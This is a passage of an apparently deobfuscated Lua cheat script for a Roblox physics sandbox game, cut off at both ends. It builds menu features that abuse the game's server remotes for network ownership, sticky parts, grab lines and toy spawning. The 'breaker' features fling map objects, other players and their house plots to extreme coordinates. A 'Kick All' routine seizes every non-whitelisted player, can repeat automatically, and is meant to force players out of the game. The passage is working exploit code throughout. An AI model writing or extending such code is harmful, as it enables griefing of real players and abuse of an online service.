							notify("Shuriken Breaker", "Invalid values [preset 0 or inf-ty syntacsis]", 2)
							playSound(sounds.Notify)
						end
					end,
				})

				v24:CreateToggle({
					Name = "Auto Collision break [Player]",
					Default = false,
					Callback = function(arg)
						flag7 = arg

						if thread then
							task.cancel(thread)
							thread = nil
						end

						if v20 then
							v20:Disconnect()
							v20 = nil
						end

						if arg then
							if not v18 then
								flag7 = false
								return
							end
							v21 = nil
							v22 = nil

							thread = task.spawn(function()
								while flag7 do
									if v18 and v18.Parent then
										local character = v18.Character

										if character then
											local humanoid = character:FindFirstChild("Humanoid")
											local flag9 = humanoid and humanoid.Health > 0
											humanoid = humanoid and humanoid.Health <= 0
											local parent = v22 and v22.Parent and v22:IsDescendantOf(workspace)
											local parent2 = v21 and v21.Parent and v21:IsDescendantOf(workspace)

											if humanoid then
												if not parent and not parent2 and not flag8 then
													fn21()
												end
											elseif flag9 then
												if parent then
													local head = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")

													if head then
														fn20(head, CFrame.new(2.5e38, 2.5e38, 2.5e38))
													end
												elseif not parent2 and not flag8 then
													fn24(CFrame.new(2.5e38, 2.5e38, 2.5e38))
												end
											end
										end
									end

									task.wait()
								end
							end)
						else
							v21 = nil
							v22 = nil
						end
					end,
				})

				Players.PlayerRemoving:Connect(function(player)
					if v18 == player then
						v18 = nil
						v21 = nil
						v22 = nil

						if v19 then
							v19:SetValue("")
						end

						if flag7 then
							flag7 = false

							if thread then
								task.cancel(thread)
							end
						end

						if v20 then
							v20:Disconnect()
							v20 = nil
						end
					end

					task.defer(function()
						fn26("")
					end)
				end)

				Players.PlayerAdded:Connect(function()
					task.defer(function()
						fn26("")
					end)
				end)

				fn26("")
			end
		end

		local lp2, Workspace, notify, v18, flag7, thread, tbl10, v19, fn15, fn16

		do
			local serverTab = _G.ServerTab
			lp2 = _G.LP
			local repS = _G.RepS or game:GetService("ReplicatedStorage")
			Workspace = game:GetService("Workspace")
			local cf2 = _G.CF or CFrame.new
			local v33 = _G.V3 or Vector3.new

			notify = _G.Notify or function(...)
				print(...)
			end

			local playSound = _G.PlaySound or function()
			end

			local sounds = _G.Sounds or {}
			local setNetworkOwner = repS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
			local stickyPartEvent = repS:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
			v18 = nil
			local v20 = nil
			local destroyToy = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("DestroyToy")
			flag7 = false
			thread = nil
			tbl10 = { Plot1 = nil, Plot2 = nil, Plot3 = nil, Plot4 = nil, Plot5 = nil }
			v19 = serverTab:CreateBlock({ Name = "Breaker object", Side = "Left", ImageID = "15889469852" })

			fn15 = function(arg)
				if not arg then
					return
				end

				if destroyToy then
					pcall(function()
						if destroyToy:IsA("RemoteEvent") then
							destroyToy:FireServer(arg)
						elseif destroyToy:IsA("RemoteFunction") then
							destroyToy:InvokeServer(arg)
						end
					end)
				else
					pcall(function()
						arg:Destroy()
					end)
				end
			end

			local function fn17(arg, arg2, arg3, arg4)
				if not arg or not arg.Parent or not arg2 or not arg3 then
					return
				end

				if setNetworkOwner then
					task.spawn(function()
						setNetworkOwner:FireServer(arg, arg.CFrame)
					end)
				end

				if stickyPartEvent then
					task.spawn(function()
						stickyPartEvent:FireServer(arg, arg3, arg4)
					end)
				end

				task.wait()

				if arg and arg.Parent then
					for _, child in pairs(arg2:GetChildren()) do
						if child:IsA("BasePart") then
							child.CanQuery = false
							child.CanCollide = false
						end
					end
				end
			end

			fn16 = function(arg, arg2)
				if not arg or not arg.Parent or not arg2 then
					return
				end
				local stickyPart = arg:WaitForChild("StickyPart", 2)
				if not stickyPart then
					return
				end
				fn17(stickyPart, arg, arg2, CFrame.new(2.5e38, 2.5e38, 2.5e38))
			end

			local function fn18(arg, arg2)
				if not arg or not arg.Parent or not arg2 then
					return
				end
				local stickyPart = arg:WaitForChild("StickyPart", 2)
				if not stickyPart then
					return
				end
				fn17(stickyPart, arg, arg2, CFrame.new(0, 0, 0))
			end

			local function fn19(arg, arg2)
				if not arg or not arg.Parent or not arg2 then
					return
				end
				local stickyPart = arg:WaitForChild("StickyPart", 2)
				if not stickyPart then
					return
				end
				fn17(stickyPart, arg, arg2, CFrame.new(0, 2.4e9, 0))
			end

			local function fn20()
				local canSpawnToy = lp2:FindFirstChild("CanSpawnToy")
				local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
				if not canSpawnToy or not spawnToyRemoteFunction then
					return nil
				end
				local now2 = tick()

				while not canSpawnToy.Value do
					if not (tick() - now2 > 3) then
						task.wait()
						continue
					end
					break
				end

				local humanoidRootPart = lp2.Character and lp2.Character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return nil
				end

				task.spawn(function()
					pcall(function()
						spawnToyRemoteFunction:InvokeServer("NinjaShuriken", humanoidRootPart.CFrame * cf2(0, 15, 20), v33(0, 0, 0))
					end)
				end)

				local now3 = tick()
				local ninjaShuriken = nil

				while not ninjaShuriken do
					if not (tick() - now3 > 3) then
						ninjaShuriken = Workspace:FindFirstChild(lp2.Name .. "SpawnedInToys")
						ninjaShuriken = ninjaShuriken and ninjaShuriken:FindFirstChild("NinjaShuriken")

						if not ninjaShuriken then
							task.wait()
						end

						continue
					end

					break
				end

				return ninjaShuriken
			end

			local function fn21(arg)
				if not arg then
					notify("Breaker object", "Select object!", 2)
					return
				end
				local v21 = fn20()
				if not v21 then
					notify("Breaker object", "Can't spawn!", 2)
					return
				end
				v20 = v21
				v21.Name = "AntiKick"
				fn16(v21, arg)
				notify("Breaker object", "Attached to " .. arg.Name, 2)
				playSound(sounds.Notify)
			end

			local function fn22(arg, arg2)
				if not arg then
					notify("Breaker object", "Select object!", 2)
					return
				end
				notify("Breaker object", "Spawning 10 shurikens...", 2)

				task.spawn(function()
					local n25 = 0

					for i = 1, 10 do
						local v21 = fn20()

						if v21 then
							v21.Name = "AntiKick"

							if arg2 then
								fn19(v21, arg)
							else
								fn18(v21, arg)
							end

							n25 += 1
						end
					end

					notify("Breaker object", tostring(n25) .. " shurikens attached!", 2)
					playSound(sounds.Notify)
				end)
			end

			local fn23 = nil

			fn23 = function(arg)
				if not arg then
					return nil
				end

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("BasePart") then
						return child
					end

					if child:IsA("Model") then
						local v21 = fn23(child)
						if v21 then
							return v21
						end
					end
				end

				return nil
			end

			local function fn24(...)
				local v21 = Workspace

				for _, v22 in ipairs({ ... }) do
					if not v21 then
						return nil
					end
					v21 = v21:FindFirstChild(v22)
				end

				return v21
			end

			local function fn25()
				local map = Workspace:FindFirstChild("Map")
				if not map then
					return nil
				end
				local alwaysHereTweenedObjects = map:FindFirstChild("AlwaysHereTweenedObjects")
				if not alwaysHereTweenedObjects then
					return nil
				end
				local ocean = alwaysHereTweenedObjects:FindFirstChild("Ocean")
				if not ocean then
					return nil
				end
				local object = ocean:FindFirstChild("Object")
				if not object then
					return nil
				end
				local objectModel = object:FindFirstChild("ObjectModel")
				if not objectModel then
					return nil
				end
				return objectModel:FindFirstChild("Ocean")
			end

			local function fn26(arg)
				local plots = Workspace:FindFirstChild("Plots")
				if not plots then
					return nil
				end
				local v21 = plots:FindFirstChild(arg)
				if not v21 then
					return nil
				end
				return v21:FindFirstChild("PlotArea")
			end

			local function fn27(arg)
				local plots = Workspace:FindFirstChild("Plots")
				if not plots then
					return false
				end
				local v21 = plots:FindFirstChild(arg)
				if not v21 then
					return false
				end
				local playersInPlots = v21:FindFirstChild("PlayersInPlots")
				if not playersInPlots then
					return false
				end
				return playersInPlots:FindFirstChild(lp2.Name) ~= nil
			end

			local function fn28()
				for k, v21 in pairs(tbl10) do
					if v21 then
						fn15(v21)
					end

					tbl10[k] = nil
				end
			end

			local tbl11 = {
				Ocean = function()
					return fn25()
				end,
				InnerUFO = function()
					return fn24("Map", "AlwaysHereTweenedObjects", "InnerUFO", "Object", "ObjectModel", "Body")
				end,
				OuterUFO = function()
					return fn24("Map", "AlwaysHereTweenedObjects", "OuterUFO", "Object", "ObjectModel", "Body")
				end,
				Train = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "Train"))
				end,
				CaveCart = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "CaveCart", "Object"))
				end,
				LrgDebris = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "LrgDebris", "Object"))
				end,
				LrgDebris2 = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "LrgDebris2", "Object"))
				end,
				SmlDebris = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "SmlDebris", "Object"))
				end,
				SmlDebris2 = function()
					return fn23(fn24("Map", "AlwaysHereTweenedObjects", "SmlDebris2", "Object"))
				end,
				["Plot1 (Green House)"] = function()
					return fn26("Plot1")
				end,
				["Plot2 (Pink House)"] = function()
					return fn26("Plot2")
				end,
				["Plot3 (Purple House)"] = function()
					return fn26("Plot3")
				end,
				["Plot4 (Blue House)"] = function()
					return fn26("Plot4")
				end,
				["Plot5 (Yellow House)"] = function()
					return fn26("Plot5")
				end,
			}

			local function fn29(arg)
				if not arg or not arg.Parent or not arg:IsDescendantOf(Workspace) then
					return false
				end
				local stickyPart = arg:FindFirstChild("StickyPart")
				if not stickyPart or not stickyPart.Parent or not stickyPart:IsDescendantOf(Workspace) then
					return false
				end
				return true
			end

			local function fn30()
				if thread then
					return
				end

				thread = task.spawn(function()
					while flag7 do
						for i = 1, 5 do
							if flag7 then
								local str5 = "Plot" .. i
								local v21 = fn26(str5)

								if v21 then
									local v22 = tbl10[str5]

									if fn27(str5) then
										if v22 then
											fn15(v22)
											tbl10[str5] = nil
										end
									elseif not fn29(v22) then
										if v22 then
											fn15(v22)
										end

										tbl10[str5] = nil
										local v23 = fn20()

										if v23 then
											v23.Name = "AntiKick"
											fn16(v23, v21)
											tbl10[str5] = v23
											notify("Breaker object", "Attached to " .. str5, 1.5)
											task.wait()
										end
									end
								end

								continue
							end

							break
						end

						task.wait(0.1)
					end

					thread = nil
				end)
			end

			v19:CreateDropdown({
				Name = "Select obj",
				Items = {
					"Ocean",
					"InnerUFO",
					"OuterUFO",
					"Train",
					"CaveCart",
					"LrgDebris",
					"LrgDebris2",
					"SmlDebris",
					"SmlDebris2",
					"Plot1 (Green House)",
					"Plot2 (Pink House)",
					"Plot3 (Purple House)",
					"Plot4 (Blue House)",
					"Plot5 (Yellow House)",
				},
				Default = "Ocean",
				Callback = function(arg)
					local v21 = tbl11[arg]

					if v21 then
						local v22 = v21()

						if v22 then
							v18 = v22
						else
							v18 = nil
						end
					end
				end,
			})

			v19:CreateKeybind({
				Name = "Collide Breaker",
				Default = Enum.KeyCode.Two,
				HoldToInteract = false,
				Callback = function()
					if v18 then
						fn21(v18)
					else
						notify("Breaker object", "Select object first!", 2)
					end
				end,
			})

			v19:CreateKeybind({
				Name = "Debris Breaker (x10 attach)",
				Default = Enum.KeyCode.Three,
				HoldToInteract = false,
				Callback = function()
					if v18 then
						local flag8 = false

						for _, descendant in pairs(Workspace:GetDescendants()) do
							if descendant == v18 and descendant.Name == "Ocean" then
								flag8 = true
								break
							end
						end

						fn22(v18, flag8)
					else
						notify("Breaker object", "Select object first!", 2)
					end
				end,
			})

			v19:CreateToggle({
				Name = "Auto Break all plots",
				Default = false,
				Flag = "AutoBreakPlots",
				Callback = function(arg)
					flag7 = arg

					if flag7 then
						notify("Breaker object", "Auto Break Plots Enabled", 2)
						fn30()
					else
						fn28()
						notify("Breaker object", "Auto Break Plots Disabled", 2)
					end
				end,
			})
		end

		local v20
		v20 = _G.ServerTab:CreateBlock({ Name = "Kick All", Side = "Right", ImageID = "94139827804377" })
		local lp3
		lp3 = _G.LP
		local ps2
		ps2 = _G.PS
		local ws2
		ws2 = _G.WS
		local destroyLine2, cf2, v33, rs, repS, notify2, currentCamera, flag8, flag9, flag10
		local connection, tbl11, n25, n26, tbl12, tbl13, v21, v22, tbl14, cFrame
		local fn17

		do
			local sno2 = _G.SNO
			destroyLine2 = _G.DestroyLine
			cf2 = _G.CF
			v33 = _G.V3
			rs = _G.RS
			repS = _G.RepS
			notify2 = _G.Notify
			currentCamera = workspace.CurrentCamera
			flag8 = false
			flag9 = false
			flag10 = false
			connection = nil
			local thread2 = nil
			local flag11 = false
			tbl11 = {}
			n25 = 15
			n26 = 8
			tbl12 = {}
			tbl13 = {}
			v21 = nil
			v22 = nil
			tbl14 = {}
			cFrame = nil

			fn17 = function(arg)
				local character = arg.Character
				if not character then
					return nil, nil
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
				return humanoidRootPart, character:FindFirstChild("Head") or humanoidRootPart
			end

			local function fn18(arg)
				if not sno2 or not arg then
					return
				end

				pcall(function()
					sno2:FireServer(arg, arg.CFrame)
				end)
			end

			local function fn19(arg)
				if not arg then
					return false
				end
				local partOwner = arg:FindFirstChild("PartOwner")
				return partOwner and partOwner.Value == lp3.Name
			end

			local function fn20(arg)
				local character = arg.Character
				if not character then
					return nil
				end
				local head = character:FindFirstChild("Head")
				if head and fn19(head) then
					return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
				end
				return nil
			end

			local function fn21()
				if connection then
					connection:Disconnect()
					connection = nil
				end
			end

			local function fn22()
				if flag11 then
					return
				end
				flag11 = true

				thread2 = task.spawn(function()
					local grabEvents = repS:FindFirstChild("GrabEvents")
					if not grabEvents then
						flag11 = false
						return
					end
					local createGrabLine = grabEvents:FindFirstChild("CreateGrabLine")
					if not createGrabLine then
						flag11 = false
						return
					end

					while flag11 do
						local spawnLocation = ws2:FindFirstChild("SpawnLocation") or ws2:FindFirstChild("Spawn")
						local humanoidRootPart

						if spawnLocation then
							humanoidRootPart = spawnLocation
						else
							humanoidRootPart = lp3.Character and lp3.Character:FindFirstChild("HumanoidRootPart")
						end

						if humanoidRootPart then
							local n27 = math.random(-9e9, 9e9)
							local n28 = math.random(-9e9, 9e9)

							pcall(function()
								local cframe = CFrame.new
								createGrabLine:FireServer(humanoidRootPart, CFrame.new(n27, 0, n28), cframe(n27, 0, n28))
							end)
						end

						task.wait()
					end
				end)
			end

			local function fn23()
				flag11 = false

				if thread2 then
					task.cancel(thread2)
					thread2 = nil
				end
			end

			local function fn24()
				fn23()
				fn21()

				if v22 and v21 then
					local v23 = v21
					local v24 = v22
					local humanoidRootPart = v21:FindFirstChild("HumanoidRootPart")
					local humanoid = v23:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart2 = v24:FindFirstChild("HumanoidRootPart")
					local cFrame2 = cFrame

					if humanoidRootPart2 then
						cFrame2 = humanoidRootPart2.CFrame
					end

					if humanoidRootPart and cFrame2 then
						humanoidRootPart.CFrame = cFrame2
						humanoidRootPart.AssemblyLinearVelocity = v33(0, 0, 0)
						humanoidRootPart.Velocity = v33(0, 0, 0)
					end

					for k, v25 in pairs(tbl14) do
						if k and k.Parent then
							k.CanCollide = v25.canCollide
							k.Transparency = v25.transparency
						end
					end

					local cFrame3 = currentCamera.CFrame
					currentCamera.CameraType = Enum.CameraType.Scriptable
					currentCamera.CFrame = cFrame3
					lp3.Character = v23

					if humanoid then
						currentCamera.CameraSubject = humanoid
					end

					task.defer(function()
						currentCamera.CameraType = Enum.CameraType.Custom
					end)

					if v24 then
						v24:Destroy()
					end

					v21 = nil
					v22 = nil
					tbl14 = {}
					cFrame = nil
				end

				flag8 = false
			end

			local v23 = nil
			local v24 = nil

			local function fn25()
				local tbl15 = {}

				for _, v25 in ipairs(tbl11) do
					if ps2:FindFirstChild(v25) then
						table.insert(tbl15, v25)
					end
				end

				tbl11 = tbl15
				local tbl16 = {}

				for _, v25 in ipairs(tbl11) do
					local v26 = ps2:FindFirstChild(v25)

					if v26 then
						table.insert(tbl16, v26.DisplayName .. " | " .. v26.Name)
					end
				end

				if v24 then
					v24:Refresh(tbl16)
				end
			end

			local function fn26(arg)
				local tbl15 = {}
				local v25 = string.lower(arg or "")

				for _, player in pairs(ps2:GetPlayers()) do
					if player ~= lp3 then
						local str5 = player.DisplayName .. " | " .. player.Name

						if v25 == "" or string.find(string.lower(str5), v25, 1, true) then
							table.insert(tbl15, str5)
						end
					end
				end

				table.sort(tbl15)

				if v23 then
					v23:Refresh(tbl15)
				end
			end

			local function fn27(arg, arg2, arg3, arg4, arg5)
				local v25, v26 = fn17(arg)
				if not arg2 or not v26 or not v25 then
					return nil
				end

				if (v25.Position - arg2.Position).Magnitude > 25 then
					local n27 = 0

					connection = rs.RenderStepped:Connect(function()
						n27 += 1
						if n27 % 2 ~= 0 then
							return
						end

						if not arg2 or not arg2.Parent then
							return
						end
						local v27 = fn17(arg)

						if v27 then
							arg2.CFrame = v27.CFrame * cf2(0, -10, 0)
							arg2.AssemblyLinearVelocity = v33(0, 0, 0)
						end
					end)
				end

				local now2 = tick()
				local n27 = 0

				while tick() - now2 < 1 and arg.Parent do
					local now3 = tick()
					local v27, v28 = fn17(arg)

					if v28 and v27 then
						if fn19(v28) then
							fn21()
							local character = arg.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if character then
								character.PlatformStand = true
								character.Sit = false
							end

							if arg5 then
								arg5(v27)
							end

							return v27
						end

						if now3 - n27 >= 0.05 then
							fn18(v28)

							if arg3 then
								for _, v29 in ipairs(arg3) do
									if not v29.target and v29.plr ~= arg then
										local v30, v31 = fn17(v29.plr)

										if v31 and v30 then
											fn18(v31)

											if fn19(v31) then
												v29.target = v30
												local character = v29.plr.Character
												character = character and character:FindFirstChildOfClass("Humanoid")

												if character then
													character.PlatformStand = true
													character.Sit = false
												end

												if v29.callback then
													v29.callback(v30)
												end
											end
										end
									end
								end

								n27 = now3
							else
								n27 = now3
							end
						end
					end

					task.wait()
				end

				fn21()

				if flag10 and arg and arg.Parent and not table.find(tbl11, arg.Name) then
					table.insert(tbl11, arg.Name)

					pcall(function()
						notify2("Whitelist", "Auto-whitelisted: " .. arg.Name, 2)
						fn25()
					end)
				end

				return nil
			end

			local function fn28(parent, position)
				if not parent or not parent.Parent then
					return
				end
				local parent2 = parent.Parent
				local humanoid = parent2 and parent2:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = true
					humanoid.Sit = false
				end

				local cframe = CFrame.lookAt(position, position + v33(1, 0, 0))

				pcall(function()
					parent.CFrame = cframe
					parent.AssemblyLinearVelocity = v33(0, 0, 0)
					parent.Velocity = v33(0, 0, 0)
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
						child:Destroy()
					end
				end

				local bodyPosition = Instance.new("BodyPosition")
				bodyPosition.MaxForce = v33(math.huge, math.huge, math.huge)
				bodyPosition.P = 50000
				bodyPosition.D = 100
				bodyPosition.Position = position
				bodyPosition.Parent = parent
				local bodyGyro = Instance.new("BodyGyro")
				bodyGyro.MaxTorque = v33(math.huge, math.huge, math.huge)
				bodyGyro.P = 50000
				bodyGyro.D = 100
				bodyGyro.CFrame = cframe
				bodyGyro.Parent = parent

				task.delay(5, function()
					pcall(function()
						bodyPosition:Destroy()
					end)

					pcall(function()
						bodyGyro:Destroy()
					end)
				end)
			end

			v20:CreateInput({
				Name = "Search player",
				Default = "",
				Placeholder = "Type to search...",
				Callback = function(arg)
					fn26(arg)
				end,
			})

			v23 = v20:CreateDropdown({
				Name = "Select player to whitelist",
				Items = {},
				Default = "",
				Callback = function(arg)
					if not arg or arg == "" then
						return
					end
					local v25 = arg:split(" | ")[2]

					if v25 and not table.find(tbl11, v25) then
						table.insert(tbl11, v25)
						notify2("Whitelist", "Added", 2)
						fn25()
						v23:SetValue("")
					end
				end,
			})

			v24 = v20:CreateDropdown({
				Name = "Whitelisted players",
				Items = {},
				Default = "",
				Callback = function(arg)
					if not arg or arg == "" then
						return
					end
					local v25 = arg:split(" | ")[2]

					for i, v26 in ipairs(tbl11) do
						if v26 == v25 then
							table.remove(tbl11, i)
							break
						end
					end

					notify2("Whitelist", "Removed", 2)
					fn25()
					v24:SetValue("")
				end,
			})

			v20:CreateButton({
				Name = "Delete all whitelist",
				Callback = function()
					tbl11 = {}
					fn25()
					notify2("Whitelist", "Cleared", 2)
				end,
			})

			v20:CreateToggle({
				Name = "Auto Whitelist",
				Default = false,
				Flag = "AutoWhitelistToggle",
				Callback = function(arg)
					flag10 = arg
				end,
			})

			local function fn29()
				if flag8 then
					return
				end
				flag8 = true
				local character = lp3.Character
				if not character then
					flag8 = false
					return
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart or not humanoid then
					flag8 = false
					return
				end
				local tbl15 = {}
				local tbl16 = {}

				for _, player in pairs(ps2:GetPlayers()) do
					if player ~= lp3 and not table.find(tbl11, player.Name) then
						local v25, v26 = fn17(player)

						if v25 and v26 then
							tbl16[player] = true
							local n27 = tbl12[player]

							if not n27 then
								for i = 1, 24 do
									if not tbl13[i] then
										tbl13[i] = player
										tbl12[player] = i
										n27 = i
										break
									end
								end

								n27 = n27 or #tbl12 % 24 + 1
							end

							table.insert(tbl15, { plr = player, slotIndex = n27 })
						end
					end
				end

				if #tbl15 == 0 then
					flag8 = false
					return
				end
				fn22()
				cFrame = humanoidRootPart.CFrame
				local v25 = cFrame
				tbl14 = {}

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						tbl14[descendant] = { canCollide = descendant.CanCollide, transparency = descendant.Transparency }
					end
				end

				character.Archivable = true
				local clone = character:Clone()
				local humanoidRootPart2 = clone:FindFirstChild("HumanoidRootPart")
				local humanoid2 = clone:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart2 or not humanoid2 then
					fn24()
					return
				end
				clone.Name = character.Name
				clone.Parent = ws2
				humanoidRootPart2.CFrame = v25

				for _, descendant in ipairs(clone:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.LocalTransparencyModifier = 0
					end
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
						descendant.Transparency = 1
					end
				end

				v21 = character
				v22 = clone
				local cFrame2 = currentCamera.CFrame
				currentCamera.CameraType = Enum.CameraType.Scriptable
				currentCamera.CFrame = cFrame2
				lp3.Character = clone
				currentCamera.CameraSubject = humanoid2

				task.defer(function()
					currentCamera.CameraType = Enum.CameraType.Custom
				end)

				local connection2 = nil

				local ok, result = pcall(function()
					local v26 = humanoidRootPart
					if not v26 then
						return
					end
					local n27 = v25.Position.Y + n26

					connection2 = ps2.PlayerAdded:Connect(function(player)
						if player ~= lp3 and not table.find(tbl11, player.Name) then
							local v27, v28 = fn17(player)

							if v27 and v28 and not tbl16[player] then
								tbl16[player] = true
								local n28 = tbl12[player]

								if not n28 then
									for i = 1, 24 do
										if not tbl13[i] then
											tbl13[i] = player
											tbl12[player] = i
											n28 = i
											break
										end
									end

									n28 = n28 or #tbl12 % 24 + 1
								end

								table.insert(tbl15, { plr = player, slotIndex = n28 })
							end
						end
					end)

					local v27 = v33(v25.Position.X, n27, v25.Position.Z)

					for _, v28 in ipairs(tbl15) do
						local n28 = (v28.slotIndex - 1) / 24 * 6.2831853071795862
						v28.slotPos = v33(v27.X + math.cos(n28) * n25, n27, v27.Z + math.sin(n28) * n25)
					end

					local flag12 = false

					for _, v28 in ipairs(tbl15) do
						if v28.plr and v28.plr.Parent then
							v28.slotPos = v28.slotPos or v27

							v28.callback = function(arg)
								fn28(arg, v28.slotPos)
								local v29 = fn17(v28.plr)

								if v29 and destroyLine2 then
									pcall(function()
										destroyLine2:FireServer(v29)
									end)
								end
							end

							local v29 = fn20(v28.plr)

							if v29 then
								v28.target = v29
								local character2 = v28.plr.Character
								character2 = character2 and character2:FindFirstChildOfClass("Humanoid")

								if character2 then
									character2.PlatformStand = true
									character2.Sit = false
								end

								v28.callback(v29)
							else
								local v30 = fn17(v28.plr)

								if v30 and (v30.Position - v26.Position).Magnitude > 25 then
									flag12 = true
								end

								local v31 = fn27(v28.plr, humanoidRootPart, tbl15, v28.slotPos, v28.callback, v27)

								if v31 then
									v28.target = v31
								end

								fn21()

								if flag12 and humanoidRootPart and v26.Parent then
									v26.CFrame = v25
									v26.AssemblyLinearVelocity = v33(0, 0, 0)
									v26.Velocity = v33(0, 0, 0)
								end
							end
						end
					end

					fn21()

					if flag12 and humanoidRootPart and v26.Parent then
						v26.CFrame = v25
						v26.AssemblyLinearVelocity = v33(0, 0, 0)
						v26.Velocity = v33(0, 0, 0)
					end
				end)

				if connection2 then
					pcall(function()
						connection2:Disconnect()
					end)

					connection2 = nil
				end

				fn24()

				if not ok then
					notify2("Kick All", "Error: " .. tostring(result), 3)
				end
			end

			v20:CreateButton({
				Name = "Kick All [start]",
				Callback = function()
					task.spawn(function()
						fn29()
						task.wait(4)

						if not flag9 then
							fn23()
						end
					end)
				end,
			})

			v20:CreateToggle({
				Name = "Auto kick all",
				Default = false,
				Flag = "AutoKickAllToggle",
				Callback = function(arg)
					flag9 = arg

					if flag9 then
						fn22()
					else
						fn24()
					end
				end,
			})

			task.spawn(function()
				while true do
					task.wait(0.5)

					if flag9 and not flag8 then
						local character = lp3.Character
						character = character and character:FindFirstChild("HumanoidRootPart")

						if character then
							local position = character.Position
							local flag12 = false

							for _, player in pairs(ps2:GetPlayers()) do
								if player ~= lp3 and not table.find(tbl11, player.Name) then
									local v25 = fn17(player)

									if v25 then
										if (v25.Position - position).Magnitude > 25 then
											flag12 = true
											break
										end
										flag12 = false
										continue
									end

									flag12 = false
									continue
								end

								flag12 = false
							end

							if flag12 then
								fn29()
								continue
							end
						end
					end
				end
			end)

			ps2.PlayerAdded:Connect(function()
				fn26("")
				fn25()
			end)

			ps2.PlayerRemoving:Connect(function(player)
				local v25 = tbl12[player]

				if v25 then
					tbl13[v25] = nil
					tbl12[player] = nil
				end

				fn26("")
				fn25()
			end)

			fn26("")
			fn25()
		end

		_G.FigureLockBlock = _G.MiscTab:CreateBlock({ Name = "Figure bring [Pose]", Side = "Left", ImageID = "128540628323761" })
		figureLockBlock = _G.FigureLockBlock
		permanentPallet = _G.PermanentPallet or _G.States.PermanentPallet
		lp = _G.LP
		ps = _G.PS or game:GetService("Players")
		ws = _G.WS
		sno = _G.SNO
		destroyLine = _G.DestroyLine
		cf = _G.CF
		v32 = _G.V3
		v16 = tick
		v17 = pcall
		wait_ = task.wait

		do
			local HttpService = game:GetService("HttpService")

			tbl5 = {
				"Torso",
				"Head",
				"Left Arm",
				"Right Arm",
				"Left Leg",
				"Right Leg",
				"HumanoidRootPart",
				"UpperTorso",
				"LowerTorso",
			}

			local tbl15 = {
				Torso = { X = 0, Y = 4, Z = 0, RX = 0, RY = -180, RZ = 0 },
				Head = { X = 0, Y = 1.5, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Left Arm"] = { X = -1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Right Arm"] = { X = 1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Left Leg"] = { X = -0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Right Leg"] = { X = 0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
			}

			local tbl16 = {
				Torso = { X = 0, Y = 1.4, Z = -1.1, RX = 0, RY = -180, RZ = 0 },
				Head = { X = 0, Y = 1.5, Z = 0, RX = -21, RY = 0, RZ = 0 },
				["Left Arm"] = { X = -1.4, Y = -0.4, Z = -0.6, RX = 50, RY = 0, RZ = 0 },
				["Right Arm"] = { X = 1.4, Y = -0.3, Z = -0.6, RX = 58, RY = 0, RZ = 0 },
				["Left Leg"] = { X = -1.1, Y = -1.7, Z = -0.9, RX = 55, RY = 2, RZ = -32 },
				["Right Leg"] = { X = 1.2, Y = -1.7, Z = -0.9, RX = 52, RY = 7, RZ = 35 },
			}

			local tbl17 = {
				Torso = { X = 0, Y = 0, Z = 1.2, RX = -2, RY = 0, RZ = 0 },
				Head = { X = 0, Y = 1.5, Z = 0, RX = -1, RY = -4, RZ = -11 },
				["Left Arm"] = { X = -1, Y = 1, Z = -0.8, RX = 118, RY = 29, RZ = 18 },
				["Right Arm"] = { X = 1.2, Y = 1, Z = -0.8, RX = -77, RY = -180, RZ = 165 },
				["Left Leg"] = { X = -0.6, Y = -2, Z = 0.2, RX = -11, RY = 14, RZ = -7 },
				["Right Leg"] = { X = 0.5, Y = -1.9, Z = -0.1, RX = -3, RY = 7, RZ = 9 },
			}

			local tbl18 = {
				Torso = { X = 0, Y = -0.9, Z = 1.7, RX = -22, RY = 2.2, RZ = 1.4 },
				Head = { X = 0, Y = 1.5, Z = -0.3, RX = -5, RY = 2.1, RZ = 0 },
				["Left Arm"] = { X = -1, Y = 0.5, Z = -0.9, RX = 90, RY = -2, RZ = 7 },
				["Right Arm"] = { X = 1, Y = 0.5, Z = -0.8, RX = 90, RY = -2, RZ = -2 },
				["Left Leg"] = { X = -1, Y = -1.2, Z = 1.3, RX = -71, RY = -1, RZ = -16 },
				["Right Leg"] = { X = 1, Y = -1.2, Z = 1.3, RX = -71, RY = 1, RZ = 16 },
			}

			local tbl19 = {
				Torso = { X = 0, Y = 0, Z = -1.1, RX = 0, RY = 0, RZ = 0 },
				Head = { X = 0, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Left Arm"] = { X = -0.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
